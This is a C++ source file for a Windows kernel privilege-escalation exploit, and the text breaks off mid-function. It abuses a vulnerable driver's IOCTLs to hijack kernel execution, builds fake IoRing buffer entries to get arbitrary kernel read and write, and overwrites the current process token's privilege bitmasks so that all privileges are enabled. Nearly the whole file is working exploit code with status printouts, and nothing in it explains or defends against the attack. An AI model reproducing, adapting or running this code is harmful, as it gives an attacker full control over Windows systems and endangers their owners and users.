#include <iostream>
#include <windows.h>
#include <ioringapi.h>
#include <winternl.h>

typedef struct _IO_TIMER* PIO_TIMER;
typedef short CSHORT;
#define DEVICE_TYPE ULONG;

#define MAXIMUM_VOLUME_LABEL_LENGTH  (32 * sizeof(WCHAR)) // 32 characters
#define TIMER_TOLERABLE_DELAY_BITS      6
#define TIMER_EXPIRED_INDEX_BITS        6
#define TIMER_PROCESSOR_INDEX_BITS      5
#define NT_BASE 0xfffff80025a00000
#define OUTPUT_PIPE_NAME L"\\\\.\\pipe\\IoRingExploitOutput"
#define INPUT_PIPE_NAME L"\\\\.\\pipe\\IoRingExploitInput"
#define TOKENPRIV 1

DWORD64 g_ntbase = 0;
DWORD64 g_kisystemcall64shadow = 0;
DWORD64 g_kisystemcall64 = 0;

typedef struct _VPB {
	CSHORT Type;
	CSHORT Size;
	USHORT Flags;
	USHORT VolumeLabelLength; // in bytes
	struct _DEVICE_OBJECT* DeviceObject;
	struct _DEVICE_OBJECT* RealDevice;
	ULONG SerialNumber;
	ULONG ReferenceCount;
	WCHAR VolumeLabel[MAXIMUM_VOLUME_LABEL_LENGTH / sizeof(WCHAR)];
} VPB, * PVPB;

typedef enum _IO_ALLOCATION_ACTION {
	KeepObject = 1,
	DeallocateObject,
	DeallocateObjectKeepRegisters
} IO_ALLOCATION_ACTION, * PIO_ALLOCATION_ACTION;

typedef
_Function_class_(DRIVER_CONTROL)
_IRQL_requires_same_
IO_ALLOCATION_ACTION
DRIVER_CONTROL(
	_In_ struct _DEVICE_OBJECT* DeviceObject,
	_Inout_ struct _IRP* Irp,
	_In_ PVOID MapRegisterBase,
	_In_ PVOID Context
);
typedef DRIVER_CONTROL* PDRIVER_CONTROL;

typedef struct _KDEVICE_QUEUE_ENTRY {
	LIST_ENTRY DeviceListEntry;
	ULONG SortKey;
	BOOLEAN Inserted;
} KDEVICE_QUEUE_ENTRY, * PKDEVICE_QUEUE_ENTRY, * PRKDEVICE_QUEUE_ENTRY;

typedef struct _WAIT_CONTEXT_BLOCK {
	union {
		KDEVICE_QUEUE_ENTRY WaitQueueEntry;
		struct {
			LIST_ENTRY DmaWaitEntry;
			ULONG NumberOfChannels;
			ULONG SyncCallback : 1;
			ULONG DmaContext : 1;
			ULONG ZeroMapRegisters : 1;
			ULONG Reserved : 9;
			ULONG NumberOfRemapPages : 20;
		};
	};
	PDRIVER_CONTROL DeviceRoutine;
	PVOID DeviceContext;
	ULONG NumberOfMapRegisters;
	PVOID DeviceObject;
	PVOID CurrentIrp;
	PVOID BufferChainingDpc;
} WAIT_CONTEXT_BLOCK, * PWAIT_CONTEXT_BLOCK;

typedef struct _KDPC {
	union {
		ULONG TargetInfoAsUlong;
		struct {
			UCHAR Type;
			UCHAR Importance;
			volatile USHORT Number;
		} DUMMYSTRUCTNAME;
	} DUMMYUNIONNAME;

	SINGLE_LIST_ENTRY DpcListEntry;
	KAFFINITY ProcessorHistory;
	PVOID DeferredRoutine;
	PVOID DeferredContext;
	PVOID SystemArgument1;
	PVOID SystemArgument2;
	__volatile PVOID DpcData;
} KDPC, * PKDPC, * PRKDPC;


typedef struct _KDEVICE_QUEUE {
	CSHORT Type;
	CSHORT Size;
	LIST_ENTRY DeviceListHead;
	KSPIN_LOCK Lock;

#if defined(_AMD64_)

	union {
		BOOLEAN Busy;
		struct {
			LONG64 Reserved : 8;
			LONG64 Hint : 56;
		};
	};

#else

	BOOLEAN Busy;

#endif

} KDEVICE_QUEUE, * PKDEVICE_QUEUE, * PRKDEVICE_QUEUE;

typedef struct _DISPATCHER_HEADER {
	union {
		union {
			volatile LONG Lock;
			LONG LockNV;
		} DUMMYUNIONNAME;

		struct {                            // Events, Semaphores, Gates, etc.
			UCHAR Type;                     // All (accessible via KOBJECT_TYPE)
			UCHAR Signalling;
			UCHAR Size;
			UCHAR Reserved1;
		} DUMMYSTRUCTNAME;

		struct {                            // Timer
			UCHAR TimerType;
			union {
				UCHAR TimerControlFlags;
				struct {
					UCHAR Absolute : 1;
					UCHAR Wake : 1;
					UCHAR EncodedTolerableDelay : TIMER_TOLERABLE_DELAY_BITS;
				} DUMMYSTRUCTNAME;
			};

			UCHAR Hand;
			union {
				UCHAR TimerMiscFlags;
				struct {

#if !defined(KENCODED_TIMER_PROCESSOR)

					UCHAR Index : TIMER_EXPIRED_INDEX_BITS;

#else

					UCHAR Index : 1;
					UCHAR Processor : TIMER_PROCESSOR_INDEX_BITS;

#endif

					UCHAR Inserted : 1;
					volatile UCHAR Expired : 1;
				} DUMMYSTRUCTNAME;
			} DUMMYUNIONNAME;
		} DUMMYSTRUCTNAME2;

		struct {                            // Timer2
			UCHAR Timer2Type;
			union {
				UCHAR Timer2Flags;
				struct {
					UCHAR Timer2Inserted : 1;
					UCHAR Timer2Expiring : 1;
					UCHAR Timer2CancelPending : 1;
					UCHAR Timer2SetPending : 1;
					UCHAR Timer2Running : 1;
					UCHAR Timer2Disabled : 1;
					UCHAR Timer2ReservedFlags : 2;
				} DUMMYSTRUCTNAME;
			} DUMMYUNIONNAME;

			UCHAR Timer2ComponentId;
			UCHAR Timer2RelativeId;
		} DUMMYSTRUCTNAME3;

		struct {                            // Queue
			UCHAR QueueType;
			union {
				UCHAR QueueControlFlags;
				struct {
					UCHAR Abandoned : 1;
					UCHAR DisableIncrement : 1;
					UCHAR QueueReservedControlFlags : 6;
				} DUMMYSTRUCTNAME;
			} DUMMYUNIONNAME;

			UCHAR QueueSize;
			UCHAR QueueReserved;
		} DUMMYSTRUCTNAME4;

		struct {                            // Thread
			UCHAR ThreadType;
			UCHAR ThreadReserved;

			union {
				UCHAR ThreadControlFlags;
				struct {
					UCHAR CycleProfiling : 1;
					UCHAR CounterProfiling : 1;
					UCHAR GroupScheduling : 1;
					UCHAR AffinitySet : 1;
					UCHAR Tagged : 1;
					UCHAR EnergyProfiling : 1;
					UCHAR SchedulerAssist : 1;

#if !defined(_X86_)

					UCHAR ThreadReservedControlFlags : 1;

#else

					UCHAR Instrumented : 1;

#endif

				} DUMMYSTRUCTNAME;
			} DUMMYUNIONNAME;

			union {
				UCHAR DebugActive;

#if !defined(_X86_)

				struct {
					BOOLEAN ActiveDR7 : 1;
					BOOLEAN Instrumented : 1;
					BOOLEAN Minimal : 1;
					BOOLEAN Reserved4 : 2;
					BOOLEAN AltSyscall : 1;
					BOOLEAN UmsScheduled : 1;
					BOOLEAN UmsPrimary : 1;
				} DUMMYSTRUCTNAME;

#endif

			} DUMMYUNIONNAME2;
		} DUMMYSTRUCTNAME5;

		struct {                         // Mutant
			UCHAR MutantType;
			UCHAR MutantSize;
			BOOLEAN DpcActive;
			UCHAR MutantReserved;
		} DUMMYSTRUCTNAME6;
	} DUMMYUNIONNAME;

	LONG SignalState;                   // Object lock
	LIST_ENTRY WaitListHead;            // Object lock
} DISPATCHER_HEADER, * PDISPATCHER_HEADER;


typedef struct _KEVENT {
	DISPATCHER_HEADER Header;
} KEVENT, * PKEVENT, * PRKEVENT;

typedef struct DECLSPEC_ALIGN(MEMORY_ALLOCATION_ALIGNMENT) _DEVICE_OBJECT {
	CSHORT Type;
	USHORT Size;
	LONG ReferenceCount;
	struct _DRIVER_OBJECT* DriverObject;
	struct _DEVICE_OBJECT* NextDevice;
	struct _DEVICE_OBJECT* AttachedDevice;
	struct _IRP* CurrentIrp;
	PIO_TIMER Timer;
	ULONG Flags;                                // See above:  DO_...
	ULONG Characteristics;                      // See ntioapi:  FILE_...
	__volatile PVPB Vpb;
	PVOID DeviceExtension;
	ULONG DeviceType;
	CCHAR StackSize;
	union {
		LIST_ENTRY ListEntry;
		WAIT_CONTEXT_BLOCK Wcb;
	} Queue;
	ULONG AlignmentRequirement;
	KDEVICE_QUEUE DeviceQueue;
	KDPC Dpc;

	//
	//  The following field is for exclusive use by the filesystem to keep
	//  track of the number of Fsp threads currently using the device
	//

	ULONG ActiveThreadCount;
	PSECURITY_DESCRIPTOR SecurityDescriptor;
	KEVENT DeviceLock;

	USHORT SectorSize;
	USHORT Spare1;

	struct _DEVOBJ_EXTENSION* DeviceObjectExtension;
	PVOID  Reserved;

} DEVICE_OBJECT;

typedef struct _DEVICE_OBJECT* PDEVICE_OBJECT;


//0x18 bytes (sizeof)
struct _SEP_TOKEN_PRIVILEGES
{
	ULONGLONG Present;                                                      //0x0
	ULONGLONG Enabled;                                                      //0x8
	ULONGLONG EnabledByDefault;                                             //0x10
};

//0x498 bytes (sizeof)
typedef struct _TOKEN
{
	struct _TOKEN_SOURCE TokenSource;                                       //0x0
	struct _LUID TokenId;                                                   //0x10
	struct _LUID AuthenticationId;                                          //0x18
	struct _LUID ParentTokenId;                                             //0x20
	union _LARGE_INTEGER ExpirationTime;                                    //0x28
	struct _ERESOURCE* TokenLock;                                           //0x30
	struct _LUID ModifiedId;                                                //0x38
	struct _SEP_TOKEN_PRIVILEGES Privileges;                                //0x40
	PBYTE useless;
}TOKEN, * PTOKEN;

#define SystemHandleInformation 0x10
#define SystemHandleInformationSize 1024 * 1024 * 2

using fNtQuerySystemInformation = NTSTATUS(WINAPI*)(
	ULONG SystemInformationClass,
	PVOID SystemInformation,
	ULONG SystemInformationLength,
	PULONG ReturnLength
	);

// handle information
typedef struct _SYSTEM_HANDLE_TABLE_ENTRY_INFO
{
	USHORT UniqueProcessId;
	USHORT CreatorBackTraceIndex;
	UCHAR ObjectTypeIndex;
	UCHAR HandleAttributes;
	USHORT HandleValue;
	PVOID Object;
	ULONG GrantedAccess;
} SYSTEM_HANDLE_TABLE_ENTRY_INFO, * PSYSTEM_HANDLE_TABLE_ENTRY_INFO;

// handle table information
typedef struct _SYSTEM_HANDLE_INFORMATION
{
	ULONG NumberOfHandles;
	SYSTEM_HANDLE_TABLE_ENTRY_INFO Handles[1];
} SYSTEM_HANDLE_INFORMATION, * PSYSTEM_HANDLE_INFORMATION;

#define SIZE_BUF 4096
#define IOCTL_READMSR 0x22e09c
#define IOCTL_ARBITRARYCALLDRIVER    0x22e04c
#define IA32_GS_BASE 0xc0000101
#define IA32_LSTAR	0xc0000082
#define IA32_STAR	0xc0000081
#define REGBUFFERCOUNT 0x1

//0x8 bytes (sizeof)
struct _NT_IORING_CREATE_FLAGS
{
	enum _NT_IORING_CREATE_REQUIRED_FLAGS Required;                         //0x0
	enum _NT_IORING_CREATE_ADVISORY_FLAGS Advisory;                         //0x4
};

//0x30 bytes (sizeof)
typedef struct _NT_IORING_INFO
{
	enum IORING_VERSION IoRingVersion;                                      //0x0
	struct _NT_IORING_CREATE_FLAGS Flags;                                   //0x4
	ULONG SubmissionQueueSize;                                              //0xc
	ULONG SubmissionQueueRingMask;                                          //0x10
	ULONG CompletionQueueSize;                                              //0x14
	ULONG CompletionQueueRingMask;                                          //0x18
	PVOID SubmissionQueue;                    //0x20
	PVOID CompletionQueue;                    //0x28
}NT_IORING_INFO,*PNT_IORING_INFO;

//0x80 bytes (sizeof)
typedef struct _IOP_MC_BUFFER_ENTRY
{
	USHORT Type;                                                            //0x0
	USHORT Reserved;                                                        //0x2
	ULONG Size;                                                             //0x4
	LONG ReferenceCount;                                                    //0x8
	enum _IOP_MC_BUFFER_ENTRY_FLAGS Flags;                                  //0xc
	struct _LIST_ENTRY GlobalDataLink;                                      //0x10
	PVOID Address;                                                          //0x20
	ULONG Length;                                                           //0x28
	CHAR AccessMode;                                                        //0x2c
	LONG MdlRef;                                                            //0x30
	PVOID Mdl;                                                       //0x38
	struct _KEVENT MdlRundownEvent;                                         //0x40
	ULONGLONG* PfnArray;                                                    //0x58
	BYTE dummy[0x20];                               //0x60
}IOP_MC_BUFFER_ENTRY, *PIOP_MC_BUFFER_ENTRY;



typedef struct _UIORING
{
	HANDLE handle;
	NT_IORING_INFO Info;
	UINT32 IoRingKernelAcceptedVersion;
	PVOID RegBufferArray;   // Pointer to array of IORING opperations
	UINT32 BufferArraySize;  // Size of array of opperation pointers
	PVOID Unknown;
	UINT32 FileHandlesCount;
	UINT32 SubQueueHead;
	UINT32 SubQueueTail;
}UIORING, * PUIORING;

HANDLE g_device;
PUIORING puioring = NULL;
PVOID ioringaddress = NULL;
HIORING handle = NULL;
PIOP_MC_BUFFER_ENTRY* fake_buffers = NULL;
UINT_PTR userData = 0x41414141;
ULONG numberOfFakeBuffers = 100;
PVOID addressForFakeBuffers = NULL;
HANDLE inputPipe = INVALID_HANDLE_VALUE;
HANDLE outputPipe = INVALID_HANDLE_VALUE;
HANDLE inputClientPipe = INVALID_HANDLE_VALUE;
HANDLE outputClientPipe = INVALID_HANDLE_VALUE;
IORING_BUFFER_INFO preregBuffers[REGBUFFERCOUNT] = { 0 };

void printBuffer(PCHAR buf, char* name, SIZE_T size) {
	printf("%s:\n", name);
	for (int i = 0; i < size; i++) {
		printf("buf[%d] = 0x%x\n", i, buf[i]);
	}

}

BOOL readMSR(DWORD msr_value, PVOID outputBuffer, SIZE_T outSize) {
	char* inputBuffer = (char*)VirtualAlloc(
		NULL,
		SIZE_BUF,
		MEM_COMMIT | MEM_RESERVE,
		PAGE_EXECUTE_READWRITE);

	*((DWORD*)inputBuffer) = msr_value;

	sizeof(IOP_MC_BUFFER_ENTRY);


	if (inputBuffer == NULL)
		return -2;

	printf("[+] User buffer allocated: 0x%8p\n", inputBuffer);


	DWORD bytesRet = 0;


	BOOL res = DeviceIoControl(
		g_device,
		IOCTL_READMSR,
		inputBuffer,
		SIZE_BUF,
		outputBuffer,
		outSize,
		&bytesRet,
		NULL
	);

	printf("[*] sent IOCTL_READMSR \n");
	if (!res) {
		printf("[-] DeviceIoControl failed with error: %d\n", GetLastError());
	}
	return res;
}

PVOID GetKAddrFromHandle(HANDLE handle) {
	ULONG returnLength = 0;
	fNtQuerySystemInformation NtQuerySystemInformation = (fNtQuerySystemInformation)GetProcAddress(GetModuleHandle(L"ntdll"), "NtQuerySystemInformation");
	PSYSTEM_HANDLE_INFORMATION handleTableInformation = (PSYSTEM_HANDLE_INFORMATION)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, SystemHandleInformationSize);
	NtQuerySystemInformation(SystemHandleInformation, handleTableInformation, SystemHandleInformationSize, &returnLength);

	ULONG numberOfHandles = handleTableInformation->NumberOfHandles;

	HeapFree(GetProcessHeap(), 0, handleTableInformation);
	handleTableInformation = (PSYSTEM_HANDLE_INFORMATION)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, numberOfHandles * sizeof(SYSTEM_HANDLE_TABLE_ENTRY_INFO) + sizeof(SYSTEM_HANDLE_INFORMATION) + 0x100);
	NtQuerySystemInformation(SystemHandleInformation, handleTableInformation, numberOfHandles * sizeof(SYSTEM_HANDLE_TABLE_ENTRY_INFO) + sizeof(SYSTEM_HANDLE_INFORMATION) + 0x100, &returnLength);

	for (int i = 0; i < handleTableInformation->NumberOfHandles; i++)
	{
		SYSTEM_HANDLE_TABLE_ENTRY_INFO handleInfo = (SYSTEM_HANDLE_TABLE_ENTRY_INFO)handleTableInformation->Handles[i];

		if (handleInfo.HandleValue == (USHORT)handle && handleInfo.UniqueProcessId == GetCurrentProcessId())
		{
			return handleInfo.Object;
		}
	}
}

unsigned int ExtractPml4Index(PVOID address)
{
	return ((uintptr_t)address >> 39) & 0x1ff;
}

BOOL arbitraryCallDriver(PVOID outputBuffer, SIZE_T outSize) {
	char* inputBuffer = (char*)VirtualAlloc(
		NULL,
		21,
		MEM_COMMIT | MEM_RESERVE,
		PAGE_EXECUTE_READWRITE);

	char* object = (char*)VirtualAlloc(
		(LPVOID)(0x0000001afeffe000),
		0x12000,
		MEM_COMMIT | MEM_RESERVE,
		PAGE_EXECUTE_READWRITE);
	printf("[+] object = 0x%p\n", object);
	object = (char*)(0x1aff000000 - 0x30);
	printf("[+] second object = 0x%p\n", object);

	PDEVICE_OBJECT ptr = (PDEVICE_OBJECT)(object + 0x30);

	memset(object, 0x41, 0x30);

	printf("[+] ptr = 0x%p\n", ptr);
	char* object2 = (char*)VirtualAlloc(
		NULL,
		SIZE_BUF,
		MEM_COMMIT | MEM_RESERVE,
		PAGE_EXECUTE_READWRITE);

	printf("[+] object2 = 0x%p\n", object2); //0x0000001af5ff0000
	memset(object2, 0x43, 0x30);

	char* driverObject = (char*)VirtualAlloc(
		NULL,
		SIZE_BUF,
		MEM_COMMIT | MEM_RESERVE,
		PAGE_EXECUTE_READWRITE);

	memset(driverObject, 0x50, SIZE_BUF);
	printf("[+] driverObject = 0x%p\n", driverObject);
	char* ptrDriver = driverObject + 0x30;
	char* pDriverFunction = ptrDriver + 0x1b * 8 + 0x70;

	* ((PDWORD64)pDriverFunction) = g_ntbase + 0x7f06a0;   //address of DbgkpTriageDumpRestoreState

	ptr->AttachedDevice = (PDEVICE_OBJECT)(object2 + 0x30);

	memset(ptr->AttachedDevice, 0x42, SIZE_BUF - 0x40);
	//*((DWORD*)ptr->AttachedDevice) = 0xf6000000;

	printf("[+] ptr->AttachedDevice = 0x%p\n", ptr->AttachedDevice);

#ifdef TOKENPRIV
	HANDLE TokenHandle = NULL;
	PVOID tokenAddr = NULL;
	if (OpenProcessToken(GetCurrentProcess(), TOKEN_ALL_ACCESS, &TokenHandle))
		tokenAddr = GetKAddrFromHandle(TokenHandle);
	printf("tokenHandle = 0x%p\n", TokenHandle);
	printf("tokenAddr = 0x%p\n", tokenAddr);

	char* token_buf = (char*)VirtualAlloc(
		NULL,
		SIZE_BUF,
		MEM_COMMIT | MEM_RESERVE,
		PAGE_EXECUTE_READWRITE);
#endif

	ptr->AttachedDevice->DriverObject = (_DRIVER_OBJECT*)ptrDriver;
	ptr->AttachedDevice->AttachedDevice = 0;

#ifdef TOKENPRIV
	//kernel address of token privileges
	DWORD64 kaddr_tokenprivileges = (DWORD64)tokenAddr + 0x40;
	//ptr->AttachedDevice corresponds to rcx when we hijack execution to DbgkpTriageDumpRestoreState 
	//offset 0x10 (AttachedDevice->NextDevice) we store the value of the arbitrary write
	ptr->AttachedDevice->NextDevice = (_DEVICE_OBJECT*)0x0000001ff2ffffbc;  //value of arbitrary write. All privileges enabled https://www.ired.team/miscellaneous-reversing-forensics/windows-kernel-internals/how-kernel-exploits-abuse-tokens-for-privilege-escalation#adding-more-privileges
#else

	//ptr->AttachedDevice corresponds to rcx when we hijack execution to DbgkpTriageDumpRestoreState
	ptr->AttachedDevice->NextDevice = (_DEVICE_OBJECT*)fake_buffers;  //value of arbitrary write. address of fakeBuffers
#endif
	//offset 0x0 (AttachedDevice->Type,Size,ReferenceCount) we store the address that is stored in rdx by DbgkpTriageDumpRestoreState
	PDWORD64 prdx_val = (PDWORD64)ptr->AttachedDevice;

#ifdef TOKENPRIV
	*prdx_val = (DWORD64)kaddr_tokenprivileges - 0x2078; //address of _TOKEN.Privileges of current process token
#else
	*prdx_val = (DWORD64)ioringaddress + 0xb8 - 0x2078; //address of RegBuffers in ioring kernel structure
#endif
	printf("[*] prdx_val = 0x%p\n", prdx_val);

	char* ptr2 = inputBuffer;
	*(ptr2) = 0;
	ptr2 += 1;
	*((PDWORD64)ptr2) = (DWORD64)ptr;

	printf("[+] User buffer allocated: 0x%8p\n", inputBuffer);

	DWORD bytesRet = 0;
#ifdef _DEBUG
	getchar();
#endif
	BOOL res = DeviceIoControl(
		g_device,
		IOCTL_ARBITRARYCALLDRIVER,
		inputBuffer,
		SIZE_BUF,
		outputBuffer,
		outSize,
		&bytesRet,
		NULL
	);

	printf("[*] sent IOCTL_ARBITRARYCALLDRIVER \n");
	if (!res) {
		printf("[-] DeviceIoControl failed with error: %d\n", GetLastError());
	}

#ifndef TOKENPRIV
	//update regBuffer address and size in usermode ioring
	puioring->RegBufferArray = fake_buffers;
	puioring->BufferArraySize = REGBUFFERCOUNT;
#endif
	return res;
}

PVOID
AllocateFakeBuffersArray(
	_In_ ULONG NumberOfFakeBuffers
)
{
	ULONG size;
	PVOID* fakeBuffers;

	
	//
	// This will be an array of pointers to IOP_MC_BUFFER_ENTRYs
	//


	fakeBuffers = (PVOID*)VirtualAlloc(NULL, NumberOfFakeBuffers * sizeof(PVOID), MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
	if (fakeBuffers == NULL)
	{
		printf("[-] Failed to allocate fake buffers array\n");
		return NULL;
	}
	if (!VirtualLock(fakeBuffers, NumberOfFakeBuffers * sizeof(PVOID)))
	{
		printf("[-] Failed to lock fake buffers array\n");
		return NULL;
	}
	memset(fakeBuffers, 0, NumberOfFakeBuffers * sizeof(PVOID));
	for (int i = 0; i < NumberOfFakeBuffers; i++)
	{
		fakeBuffers[i] = VirtualAlloc(NULL, sizeof(IOP_MC_BUFFER_ENTRY), MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
		if (fakeBuffers[i] == NULL)
		{
			printf("[-] Failed to allocate fake buffer\n");
			return NULL;
		}
		if (!VirtualLock(fakeBuffers[i], sizeof(IOP_MC_BUFFER_ENTRY)))
		{
			printf("[-] Failed to lock fake buffer\n");
			return NULL;
		}
		memset(fakeBuffers[i], 0x41, sizeof(IOP_MC_BUFFER_ENTRY));
	}
	
	printf("[*] fakeBuffers = 0x%p\n", fakeBuffers);
	for (int i = 0; i < NumberOfFakeBuffers; i++) {
		printf("[*] fakeBuffers[%d] = 0x%p\n", i, fakeBuffers[i]);
	}

	return fakeBuffers;
}

BOOL prepare() {
	HRESULT result;
	IORING_CREATE_FLAGS flags;

	flags.Required = IORING_CREATE_REQUIRED_FLAGS_NONE;
	flags.Advisory = IORING_CREATE_ADVISORY_FLAGS_NONE;
	
	result = CreateIoRing(IORING_VERSION_3, flags, 0x10000, 0x20000, (HIORING*)&handle);
	if (!SUCCEEDED(result))
	{
		printf("[-] Failed creating IO ring handle: 0x%x\n", result);
		return FALSE;
	}
	puioring = (PUIORING)handle;
	printf("[+] Created IoRing. handle=0x%p\n", puioring);
	//pre-register buffer array with len=1
	preregBuffers[0].Address = VirtualAlloc(NULL, 0x100, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
	if (!preregBuffers[0].Address)
	{
		printf("[-] Failed to allocate prereg buffer\n");
		return FALSE;
	}
	memset(preregBuffers[0].Address, 0x41, 0x100);
	preregBuffers[0].Length = 0x100;
	result = BuildIoRingRegisterBuffers(handle, REGBUFFERCOUNT, preregBuffers, 0);
	if (!SUCCEEDED(result))
	{
		printf("[-] Failed BuildIoRingRegisterBuffers: 0x%x\n", result);
		return FALSE;
	}
	UINT32 submitted = 0;
	result = SubmitIoRing(handle, 1, INFINITE, &submitted);
	if (!SUCCEEDED(result)) {
		printf("[-] Failed SubmitIoRing: 0x%x\n", result);
		return FALSE;
	}
	printf("[*] submitted = 0x%d\n", submitted);
	ioringaddress = GetKAddrFromHandle(puioring->handle);
	printf("[*] ioringaddress = 0x%p\n", ioringaddress);
	
	fake_buffers = (PIOP_MC_BUFFER_ENTRY*)AllocateFakeBuffersArray(
		REGBUFFERCOUNT
		);
	if (fake_buffers == NULL)
	{
		printf("[-] Failed to allocate fake buffers\n");
		return FALSE;
	}

	//
	// Create named pipes for the input/output of the I/O operations
	// and open client handles for them
	//
	inputPipe = CreateNamedPipe(INPUT_PIPE_NAME, PIPE_ACCESS_DUPLEX, PIPE_WAIT, 255, 0x1000, 0x1000, 0, NULL);
	if (inputPipe == INVALID_HANDLE_VALUE)
	{
		printf("[-] Failed to create input pipe: 0x%x\n", GetLastError());
		return FALSE;
	}
	outputPipe = CreateNamedPipe(OUTPUT_PIPE_NAME, PIPE_ACCESS_DUPLEX, PIPE_WAIT, 255, 0x1000, 0x1000, 0, NULL);
	if (outputPipe == INVALID_HANDLE_VALUE)
	{
		printf("[-] Failed to create output pipe: 0x%x\n", GetLastError());
		return FALSE;
	}

	outputClientPipe = CreateFile(OUTPUT_PIPE_NAME,
		GENERIC_READ | GENERIC_WRITE,
		FILE_SHARE_READ | FILE_SHARE_WRITE,
		NULL,
		OPEN_ALWAYS,
		FILE_ATTRIBUTE_NORMAL,
		NULL);

	if (outputClientPipe == INVALID_HANDLE_VALUE)
	{
		printf("[-] Failed to open handle to output file: 0x%x\n", GetLastError());
		return FALSE;
	}

	inputClientPipe = CreateFile(INPUT_PIPE_NAME,
		GENERIC_READ | GENERIC_WRITE,
		FILE_SHARE_READ | FILE_SHARE_WRITE,
		NULL,
		OPEN_ALWAYS,
		FILE_ATTRIBUTE_NORMAL,
		NULL);

	if (inputClientPipe == INVALID_HANDLE_VALUE)
	{
		printf("[-] Failed to open handle to input pipe: 0x%x\n", GetLastError());
		return FALSE;
	}

	return TRUE;
}

BOOL KRead(PVOID TargetAddress, PBYTE pOut, SIZE_T size) {
	DWORD bytesRead = 0;
	HRESULT result;
	UINT32 submittedEntries;
	IORING_CQE cqe;

	memset(fake_buffers[0], 0, sizeof(IOP_MC_BUFFER_ENTRY));
	fake_buffers[0]->Address = TargetAddress;
	fake_buffers[0]->Length = size;
	fake_buffers[0]->Type = 0xc02;
	fake_buffers[0]->Size = 0x80;
	fake_buffers[0]->AccessMode = 1;
	fake_buffers[0]->ReferenceCount = 1;

	auto requestDataBuffer = IoRingBufferRefFromIndexAndOffset(0, 0);
	auto requestDataFile = IoRingHandleRefFromHandle(outputClientPipe);

	result = BuildIoRingWriteFile(handle,
		requestDataFile,
		requestDataBuffer,
		size,
		0,
		FILE_WRITE_FLAGS_NONE,
		NULL,
		IOSQE_FLAGS_NONE);
	if (!SUCCEEDED(result))
	{
		printf("[-] Failed building IO ring read file structure: 0x%x\n", result);
		return FALSE;
	}

	result = SubmitIoRing(handle, 1, INFINITE, &submittedEntries);
	if (!SUCCEEDED(result))
	{
		printf("[-] Failed submitting IO ring: 0x%x\n", result);
		return FALSE;
	}
	printf("[*] submittedEntries = %d\n", submittedEntries);
	//
	// Check the completion queue for the actual status code for the operation
	//
	result = PopIoRingCompletion(handle, &cqe);
	if ((!SUCCEEDED(result)) || (!NT_SUCCESS(cqe.ResultCode)))
	{
		printf("[-] Failed reading kernel memory 0x%x\n", cqe.ResultCode);
		return FALSE;
	}

	BOOL res = ReadFile(outputPipe,
		pOut,
		size,
		&bytesRead,
		NULL);
	if (!res)
	{
		printf("[-] Failed to read from output pipe: 0x%x\n", GetLastError());
		return FALSE;
	}
	printf("[+] Successfully read %d bytes from kernel address 0x%p.\n", bytesRead,TargetAddress);
	return res;
}

BOOL KWrite(PVOID TargetAddress, PBYTE pValue, SIZE_T size) {

	DWORD bytesWritten = 0;
	HRESULT result;
	UINT32 submittedEntries;
	IORING_CQE cqe;

	printf("[*] Writing to %p the following bytes\n", TargetAddress);
	printf("[*] pValue = 0x%p\n", pValue);
	printf("[*] data: ");
	for (int i = 0; i < size; i++) {
		printf("0x%x ",pValue[i]);
	}
	printf("\n");
	if (WriteFile(inputPipe, pValue, size, &bytesWritten, NULL) == FALSE)
	{
		result = GetLastError();
		printf("[-] Failed to write into the input pipe: 0x%x\n", result);
		return FALSE;
	}
	printf("[*] bytesWritten = %d\n", bytesWritten);
	//
	// Setup another buffer entry, with the address of ioring->RegBuffers as the target
	// Use the client's handle of the input pipe for the read operation
	//
	memset(fake_buffers[0], 0, sizeof(IOP_MC_BUFFER_ENTRY));
	fake_buffers[0]->Address = TargetAddress;
	fake_buffers[0]->Length = size;
	fake_buffers[0]->Type = 0xc02;
	fake_buffers[0]->Size = 0x80;
	fake_buffers[0]->AccessMode = 1;
	fake_buffers[0]->ReferenceCount = 1;

	auto requestDataBuffer = IoRingBufferRefFromIndexAndOffset(0, 0);
	auto requestDataFile = IoRingHandleRefFromHandle(inputClientPipe);

	printf("[*] performing buildIoRingReadFile\n");
	result = BuildIoRingReadFile(handle,
		requestDataFile,
		requestDataBuffer,
		size,
		0,
		NULL,
		IOSQE_FLAGS_NONE);
	if (!SUCCEEDED(result))
	{
		printf("[-] Failed building IO ring read file structure: 0x%x\n", result);
		return FALSE;
	}

	result = SubmitIoRing(handle, 1, INFINITE, &submittedEntries);
	if (!SUCCEEDED(result))
	{
		printf("[-] Failed submitting IO ring: 0x%x\n", result);
		return FALSE;
	}
	printf("[*] submittedEntries = %d\n", submittedEntries);
	return TRUE;
}

VOID cleanup() {

	auto towrite = malloc(16);
	memset(towrite, 0x0, 16);
	printf("[*] Cleaning up...\n");
	printf("[*] Setting RegBuffersCount and RegBuffers to 0.\n");
#ifdef _DEBUG
	getchar();
#endif
	if (!KWrite((PVOID)((DWORD64)ioringaddress + 0xb0), (PBYTE)towrite,16)) {
		printf("[-] cleanup failed during Kwrite64\n");
	}
	puioring->RegBufferArray = NULL;
	puioring->BufferArraySize = 0;
	if (g_device != INVALID_HANDLE_VALUE) {
		CloseHandle(g_device);
	}
	if (puioring != NULL) {
		CloseIoRing((HIORING)puioring);
	}
}

VOID IncrementPrivileges() {
	HANDLE TokenHandle = NULL;
	PVOID tokenAddr = NULL;
	if (OpenProcessToken(GetCurrentProcess(), TOKEN_ALL_ACCESS, &TokenHandle))
		tokenAddr = GetKAddrFromHandle(TokenHandle);
	printf("[+] tokenHandle = 0x%p\n", TokenHandle);
	printf("[+] tokenAddr = 0x%p\n", tokenAddr);

	_SEP_TOKEN_PRIVILEGES original_privs = { 0 };

	printf("[*] Reading original token privileges...\n");

	KRead((PVOID)((DWORD64)tokenAddr + 0x40), (PBYTE)&original_privs, sizeof(original_privs));
	printf("[+] original_privs.Present = 0x%llx\n", original_privs.Present);
	printf("[+] original_privs.Enabled = 0x%llx\n", original_privs.Enabled);
	printf("[+] original_privs.EnabledByDefault = 0x%llx\n", original_privs.EnabledByDefault);
	//KRead64((PVOID)((DWORD64)tokenAddr + 0x40), (PDWORD64)&tokenAddr);

	_SEP_TOKEN_PRIVILEGES privs = { 0 };
	privs.Enabled = 0x0000001ff2ffffbc;
	privs.Present = 0x0000001ff2ffffbc;
	privs.EnabledByDefault = original_privs.EnabledByDefault;

